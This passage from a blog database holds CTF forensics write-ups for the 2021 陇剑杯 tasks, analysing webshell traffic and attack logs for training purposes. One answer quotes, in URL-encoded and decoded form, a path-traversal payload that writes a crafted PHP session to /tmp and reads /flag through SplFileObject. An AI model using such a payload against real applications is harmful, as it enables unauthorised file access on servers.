2021webshell（问3）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>看到权限，可能会想到通过whoami这些命令进行过滤，但是出来的东西有点多。<br>我们不妨直接猜一手，因为一般权限无非root 和www-data.<br>得到是www-data</p>\n<h2 id=\"陇剑杯-2021webshell（问4）\"><a href=\"#陇剑杯-2021webshell（问4）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问4）\"></a>陇剑杯 2021webshell（问4）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>这一问就不用说了，前面就已经看出来1.php就是马子了。<br>要是非问为啥，那原因就是看他流量特征，一眼蚁剑<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2023.04.38.png\"></p>\n<p><a href=\"https://www.freebuf.com/articles/network/204796.html\">常见webshell客户端流量特征</a></p>\n<h2 id=\"陇剑杯-2021webshell（问5）\"><a href=\"#陇剑杯-2021webshell（问5）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问5）\"></a>陇剑杯 2021webshell（问5）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>这里我一开始是想找上传的哪个数据包的，后来误打误撞发现了一个类似于 <code>ls</code> 命令的返回包。发现了frpc.ini<br>于是直接就能得出就是frpc了。</p>\n<p>还有正常解法，就是看看比较大的包，大概率就是上传的包了。</p>\n<h2 id=\"陇剑杯-2021webshell（问6）\"><a href=\"#陇剑杯-2021webshell（问6）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问6）\"></a>陇剑杯 2021webshell（问6）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n\n开启环境0\n</code></pre>\n<p>这题我目前也不是很清楚，最后找到frpc.ini文件的时候是需要hex解码的。<br>最后就得到反连的ip是192.168.239.123</p>\n<h2 id=\"陇剑杯-2021webshell（问7）\"><a href=\"#陇剑杯-2021webshell（问7）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问7）\"></a>陇剑杯 2021webshell（问7）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n\n开启环境0\n</code></pre>\n<p>都在hex解密之后的frpc.ini中<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2000.16.24.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"陇剑杯-2021-webshell（问1）\"><a href=\"#陇剑杯-2021-webshell（问1）\" class=\"headerlink\" title=\"陇剑杯 2021  webshell（问1）\"></a>陇剑杯 2021  webshell（问1）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>题目描述说是登录系统，根据日常经验，一般登录操作使用的都是POST请求，于是我们直接在流量包中搜索POST请求看看。</p>\n<pre><code>http.request.method==POST\n</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.32.34.png\"><br>然后追踪流看看，运气比较好第一个就是。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.35.35.png\"><br>交差下班。</p>\n<h2 id=\"陇剑杯-2021webshell（问2）\"><a href=\"#陇剑杯-2021webshell（问2）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问2）\"></a>陇剑杯 2021webshell（问2）</h2><pre><code>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>关键词：日志。直接搜索.log看看.<br>发现东西有点多。<br>需要再想个法子缩小范围。<br>想到既然是通过挂马进行修改，那么看看他的🐎子是啥类型的，我们就可以通过请求类型进行进一步缩小范围。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.42.47.png\"><br>发现一列1.php，应该就是🐎子了，再看一眼确定没错，是post马子。</p>\n<p>然后就一个个看，第一个就是。<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.49.21.png\"><br>但是发现只是相对路径，所以还要结合传马的位置拼接得到：<br><code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p>\n<h2 id=\"陇剑杯-2021webshell（问3）\"><a href=\"#陇剑杯-2021webshell（问3）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问3）\"></a>陇剑杯 2021webshell（问3）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>看到权限，可能会想到通过whoami这些命令进行过滤，但是出来的东西有点多。<br>我们不妨直接猜一手，因为一般权限无非root 和www-data.<br>得到是www-data</p>\n<h2 id=\"陇剑杯-2021webshell（问4）\"><a href=\"#陇剑杯-2021webshell（问4）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问4）\"></a>陇剑杯 2021webshell（问4）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>这一问就不用说了，前面就已经看出来1.php就是马子了。<br>要是非问为啥，那原因就是看他流量特征，一眼蚁剑<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2023.04.38.png\"></p>\n<p><a href=\"https://www.freebuf.com/articles/network/204796.html\">常见webshell客户端流量特征</a></p>\n<h2 id=\"陇剑杯-2021webshell（问5）\"><a href=\"#陇剑杯-2021webshell（问5）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问5）\"></a>陇剑杯 2021webshell（问5）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>这里我一开始是想找上传的哪个数据包的，后来误打误撞发现了一个类似于 <code>ls</code> 命令的返回包。发现了frpc.ini<br>于是直接就能得出就是frpc了。</p>\n<p>还有正常解法，就是看看比较大的包，大概率就是上传的包了。</p>\n<h2 id=\"陇剑杯-2021webshell（问6）\"><a href=\"#陇剑杯-2021webshell（问6）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问6）\"></a>陇剑杯 2021webshell（问6）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n\n开启环境0\n</code></pre>\n<p>这题我目前也不是很清楚，最后找到frpc.ini文件的时候是需要hex解码的。<br>最后就得到反连的ip是192.168.239.123</p>\n<h2 id=\"陇剑杯-2021webshell（问7）\"><a href=\"#陇剑杯-2021webshell（问7）\" class=\"headerlink\" title=\"陇剑杯 2021webshell（问7）\"></a>陇剑杯 2021webshell（问7）</h2><pre><code>题目描述：\n\n单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n\n开启环境0\n</code></pre>\n<p>都在hex解密之后的frpc.ini中<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2000.16.24.png\"></p>\n"},{"title":"陇剑杯 2021 misc 日志分析","date":"2023-08-24T04:34:19.000Z","_content":"## 陇剑杯 2021 日志分析（问1）\n```\n题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。\n```\n打开日志文件，不知道用哪个软件比较好分析，还请各位大佬指点。\n我直接用vscode打开看看\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.39.08.png)\n发现主要信息集中于请求路径和状态码。\n大部分都是404，直接全局搜索200看看\n\n大概下半段就可以看到请求www.zip时为200.\n下班！\n\n## 陇剑杯 2021 日志分析（问2）\n```\n题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF{}格式提交。\n```\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.46.43.png)\n全局搜索一下tmp，发现有\n`/?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D`\n解一下码好看一点。\n`/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:\"filename\";s:16:\"./files/filename\";s:20:\"call_user_func_array\";s:28:\"./files/call_user_func_array\";}paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";}`\n\n得到sess_car.\n\n\n## 陇剑杯 2021 日志分析（问3）\n```\n题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF{}格式提交。\n```\n上一题中解码出来的payload就能看出时SplFileObject类进行读取。","source":"_posts/陇剑杯 2021 misc 日志分析.md","raw":"---\ntitle: 陇剑杯 2021 misc 日志分析\ndate: 2023-08-24 12:34:19\ntags:\n- misc\n- 日志分析\ncategories:\n- ctf\n- writeup\n---\n## 陇剑杯 2021 日志分析（问1）\n```\n题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。\n```\n打开日志文件，不知道用哪个软件比较好分析，还请各位大佬指点。\n我直接用vscode打开看看\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.39.08.png)\n发现主要信息集中于请求路径和状态码。\n大部分都是404，直接全局搜索200看看\n\n大概下半段就可以看到请求www.zip时为200.\n下班！\n\n## 陇剑杯 2021 日志分析（问2）\n```\n题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF{}格式提交。\n```\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.46.43.png)\n全局搜索一下tmp，发现有\n`/?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D`\n解一下码好看一点。\n`/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:\"filename\";s:16:\"./files/filename\";s:20:\"call_user_func_array\";s:28:\"./files/call_user_func_array\";}paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";}`\n\n得到sess_car.\n\n\n## 陇剑杯 2021 日志分析（问3）\n```\n题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF{}格式提交。\n```\n上一题中解码出来的payload就能看出时SplFileObject类进行读取。","slug":"陇剑杯 2021 misc 日志分析","published":1,"updated":"2023-08-24T04:59:04.625Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkzf000j1ao53wkwe6uy","content":"<h2 id=\"陇剑杯-2021-日志分析（问1）\"><a href=\"#陇剑杯-2021-日志分析（问1）\" class=\"headerlink\" title=\"陇剑杯 2021 日志分析（问1）\"></a>陇剑杯 2021 日志分析（问1）</h2><pre><code>题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>打开日志文件，不知道用哪个软件比较好分析，还请各位大佬指点。<br>我直接用vscode打开看看<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.39.08.png\"><br>发现主要信息集中于请求路径和状态码。<br>大部分都是404，直接全局搜索200看看</p>\n<p>大概下半段就可以看到请求<a href=\"http://www.zip时为200/\">www.zip时为200</a>.<br>下班！</p>\n<h2 id=\"陇剑杯-2021-日志分析（问2）\"><a href=\"#陇剑杯-2021-日志分析（问2）\" class=\"headerlink\" title=\"陇剑杯 2021 日志分析（问2）\"></a>陇剑杯 2021 日志分析（问2）</h2><pre><code>题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.46.43.png\"><br>全局搜索一下tmp，发现有<br><code>/?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</code><br>解一下码好看一点。<br><code>/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</code></p>\n<p>得到sess_car.</p>\n<h2 id=\"陇剑杯-2021-日志分析（问3）\"><a href=\"#陇剑杯-2021-日志分析（问3）\" class=\"headerlink\" title=\"陇剑杯 2021 日志分析（问3）\"></a>陇剑杯 2021 日志分析（问3）</h2><pre><code>题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>上一题中解码出来的payload就能看出时SplFileObject类进行读取。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"陇剑杯-2021-日志分析（问1）\"><a href=\"#陇剑杯-2021-日志分析（问1）\" class=\"headerlink\" title=\"陇剑杯 2021 日志分析（问1）\"></a>陇剑杯 2021 日志分析（问1）</h2><pre><code>题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>打开日志文件，不知道用哪个软件比较好分析，还请各位大佬指点。<br>我直接用vscode打开看看<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.39.08.png\"><br>发现主要信息集中于请求路径和状态码。<br>大部分都是404，直接全局搜索200看看</p>\n<p>大概下半段就可以看到请求<a href=\"http://www.zip时为200/\">www.zip时为200</a>.<br>下班！</p>\n<h2 id=\"陇剑杯-2021-日志分析（问2）\"><a href=\"#陇剑杯-2021-日志分析（问2）\" class=\"headerlink\" title=\"陇剑杯 2021 日志分析（问2）\"></a>陇剑杯 2021 日志分析（问2）</h2><pre><code>题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.46.43.png\"><br>全局搜索一下tmp，发现有<br><code>/?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</code><br>解一下码好看一点。<br><code>/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</code></p>\n<p>得到sess_car.</p>\n<h2 id=\"陇剑杯-2021-日志分析（问3）\"><a href=\"#陇剑杯-2021-日志分析（问3）\" class=\"headerlink\" title=\"陇剑杯 2021 日志分析（问3）\"></a>陇剑杯 2021 日志分析（问3）</h2><pre><code>题目描述：\n\n单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>上一题中解码出来的payload就能看出时SplFileObject类进行读取。</p>\n"},{"title":"陇剑杯 2021 misc 简单日志分析","date":"2023-08-24T04:58:32.000Z","_content":"## 陇剑杯 2021 简单日志分析（问1）\n```\n题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。\n```\n既然问的是参数，而且日志中基本都是GET请求，那么我们直接搜索 `=` 看看\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.03.18.png)\n\n得到user参数。\n## 陇剑杯 2021 简单日志分析（问2）\n```\n题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF{}格式提交。\n```\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.07.21.png)\n我们通过user参数传入的payload进行base64解密发现文件\n>/Th4s_IS_VERY_Import_Fi1e\n## 陇剑杯 2021 简单日志分析（问3）\n```\n题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口\"，例如127.0.0.1:2333）。得到的flag请使用NSSCTF{}格式提交。\n```\n一样的思路，往下找还有一个payload。解密分析看看\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.11.08.png)\n就可以拿到ip和端口啦。\ntip：\n>要注意先进行url解密。 \n>在进行base64解密\n","source":"_posts/陇剑杯 2021 misc 简单日志分析.md","raw":"---\ntitle: 陇剑杯 2021 misc 简单日志分析\ndate: 2023-08-24 12:58:32\ntags:\n- misc\n- 日志分析\ncategories:\n- ctf\n- writeup\n---\n## 陇剑杯 2021 简单日志分析（问1）\n```\n题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。\n```\n既然问的是参数，而且日志中基本都是GET请求，那么我们直接搜索 `=` 看看\n\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.03.18.png)\n\n得到user参数。\n## 陇剑杯 2021 简单日志分析（问2）\n```\n题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF{}格式提交。\n```\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.07.21.png)\n我们通过user参数传入的payload进行base64解密发现文件\n>/Th4s_IS_VERY_Import_Fi1e\n## 陇剑杯 2021 简单日志分析（问3）\n```\n题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口\"，例如127.0.0.1:2333）。得到的flag请使用NSSCTF{}格式提交。\n```\n一样的思路，往下找还有一个payload。解密分析看看\n![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.11.08.png)\n就可以拿到ip和端口啦。\ntip：\n>要注意先进行url解密。 \n>在进行base64解密\n","slug":"陇剑杯 2021 misc 简单日志分析","published":1,"updated":"2023-08-24T10:41:13.135Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkzg000m1ao53cgqb2tr","content":"<h2 id=\"陇剑杯-2021-简单日志分析（问1）\"><a href=\"#陇剑杯-2021-简单日志分析（问1）\" class=\"headerlink\" title=\"陇剑杯 2021 简单日志分析（问1）\"></a>陇剑杯 2021 简单日志分析（问1）</h2><pre><code>题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>既然问的是参数，而且日志中基本都是GET请求，那么我们直接搜索 <code>=</code> 看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.03.18.png\"></p>\n<p>得到user参数。</p>\n<h2 id=\"陇剑杯-2021-简单日志分析（问2）\"><a href=\"#陇剑杯-2021-简单日志分析（问2）\" class=\"headerlink\" title=\"陇剑杯 2021 简单日志分析（问2）\"></a>陇剑杯 2021 简单日志分析（问2）</h2><pre><code>题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.07.21.png\"><br>我们通过user参数传入的payload进行base64解密发现文件</p>\n<blockquote>\n<p>&#x2F;Th4s_IS_VERY_Import_Fi1e</p>\n</blockquote>\n<h2 id=\"陇剑杯-2021-简单日志分析（问3）\"><a href=\"#陇剑杯-2021-简单日志分析（问3）\" class=\"headerlink\" title=\"陇剑杯 2021 简单日志分析（问3）\"></a>陇剑杯 2021 简单日志分析（问3）</h2><pre><code>题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口&quot;，例如127.0.0.1:2333）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>一样的思路，往下找还有一个payload。解密分析看看<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.11.08.png\"><br>就可以拿到ip和端口啦。<br>tip：</p>\n<blockquote>\n<p>要注意先进行url解密。<br>在进行base64解密</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"陇剑杯-2021-简单日志分析（问1）\"><a href=\"#陇剑杯-2021-简单日志分析（问1）\" class=\"headerlink\" title=\"陇剑杯 2021 简单日志分析（问1）\"></a>陇剑杯 2021 简单日志分析（问1）</h2><pre><code>题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>既然问的是参数，而且日志中基本都是GET请求，那么我们直接搜索 <code>=</code> 看看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.03.18.png\"></p>\n<p>得到user参数。</p>\n<h2 id=\"陇剑杯-2021-简单日志分析（问2）\"><a href=\"#陇剑杯-2021-简单日志分析（问2）\" class=\"headerlink\" title=\"陇剑杯 2021 简单日志分析（问2）\"></a>陇剑杯 2021 简单日志分析（问2）</h2><pre><code>题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.07.21.png\"><br>我们通过user参数传入的payload进行base64解密发现文件</p>\n<blockquote>\n<p>&#x2F;Th4s_IS_VERY_Import_Fi1e</p>\n</blockquote>\n<h2 id=\"陇剑杯-2021-简单日志分析（问3）\"><a href=\"#陇剑杯-2021-简单日志分析（问3）\" class=\"headerlink\" title=\"陇剑杯 2021 简单日志分析（问3）\"></a>陇剑杯 2021 简单日志分析（问3）</h2><pre><code>题目描述：\n\n某应用程序被攻击，请分析日志后作答：\n黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口&quot;，例如127.0.0.1:2333）。得到的flag请使用NSSCTF&#123;&#125;格式提交。\n</code></pre>\n<p>一样的思路，往下找还有一个payload。解密分析看看<br><img src=\"https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.11.08.png\"><br>就可以拿到ip和端口啦。<br>tip：</p>\n<blockquote>\n<p>要注意先进行url解密。<br>在进行base64解密</p>\n</blockquote>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cllyqxkz600031ao53kuh2o73","category_id":"cllyqxkza00071ao5b5d65e4s","_id":"cllyqxkze000h1ao587tq6qfc"},{"post_id":"cllyqxkzc000c1ao5022t8o8z","category_id":"cllyqxkza00071ao5b5d65e4s","_id":"cllyqxkzf000k1ao5br7f6yqg"},{"post_id":"cllyqxkza00081ao55wuybybs","category_id":"cllyqxkzd000d1ao5e6y016yx","_id":"cllyqxkzg000n1ao501zbgpt0"},{"post_id":"cllyqxkzd000e1ao53f6r3vud","category_id":"cllyqxkze000i1ao589dl1kdg","_id":"cllyqxkzh000s1ao5gnywbn32"},{"post_id":"cllyqxkze000g1ao54w7yamyf","category_id":"cllyqxkzd000d1ao5e6y016yx","_id":"cllyqxkzj000x1ao519vtasfo"},{"post_id":"cllyqxkze000g1ao54w7yamyf","category_id":"cllyqxkzg000p1ao54nbj9qg8","_id":"cllyqxkzj00101ao5bv4s412n"},{"post_id":"cllyqxkzf000j1ao53wkwe6uy","category_id":"cllyqxkzd000d1ao5e6y016yx","_id":"cllyqxkzk00121ao5ddupgvap"},{"post_id":"cllyqxkzf000j1ao53wkwe6uy","category_id":"cllyqxkzg000p1ao54nbj9qg8","_id":"cllyqxkzk00141ao54hid0lpj"},{"post_id":"cllyqxkzg000m1ao53cgqb2tr","category_id":"cllyqxkzd000d1ao5e6y016yx","_id":"cllyqxkzk00161ao51uevfq4k"},{"post_id":"cllyqxkzg000m1ao53cgqb2tr","category_id":"cllyqxkzg000p1ao54nbj9qg8","_id":"cllyqxkzk00171ao590x1hff1"}],"PostTag":[{"post_id":"cllyqxkz300011ao53je89ygl","tag_id":"cllyqxkz700041ao552g2gr9n","_id":"cllyqxkzc000b1ao5g3s21kh3"},{"post_id":"cllyqxkz600031ao53kuh2o73","tag_id":"cllyqxkzc000a1ao5dz2q7q35","_id":"cllyqxkzg000o1ao5d8m59ahr"},{"post_id":"cllyqxkz600031ao53kuh2o73","tag_id":"cllyqxkzd000f1ao51c5600d0","_id":"cllyqxkzh000q1ao57ax7g5ky"},{"p